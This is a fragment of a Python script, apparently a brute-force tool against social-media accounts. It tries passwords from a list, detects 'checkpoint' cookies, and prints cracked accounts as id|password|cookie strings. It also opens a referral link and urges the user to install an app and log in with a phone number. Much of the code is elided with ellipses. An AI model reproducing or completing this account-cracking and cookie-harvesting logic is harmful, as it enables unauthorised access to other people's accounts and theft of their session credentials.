#Oepn Source Code Given By bilal
# All credit Goes to bilal_xd_Xy
#-----------------[ IMPORT-MODULE ]-------------------
...
os.system ("clear")
print('First Install This App❤️✨ And Login With Phone Number')
os.system("xdg-open https://h5.igemgala.com/webH5/gplink/index.html?ivd=12034298")
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}=AK47=CP=>{k} {idf}|{pw}{N}')     
				...
				if 'no' in taplikasi:
					...
					print(f'\r{x}=AK47=OK=>{H}{idf}|{pw}|{kuki}{N}')
					...
					print(f'\r{x}=AK47=OK=> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
